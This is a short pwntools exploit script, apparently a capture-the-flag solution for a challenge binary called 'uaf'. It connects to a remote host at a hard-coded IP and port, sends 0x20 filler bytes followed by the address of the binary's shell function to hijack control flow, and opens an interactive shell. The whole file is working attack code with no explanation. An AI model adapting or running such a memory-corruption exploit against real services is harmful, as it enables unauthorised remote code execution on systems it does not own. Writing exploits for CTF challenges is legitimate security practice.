from pwn import *

# p = process("./uaf")
p = remote("141.164.39.45", 9494)
e = ELF("./uaf")

shell = e.sym['shell']

payload = b''
payload += b'A' * 0x20
payload += p64(shell)

# p.sendlineafter(b'Who you are?\n', payload)
p.send(payload)

p.interactive()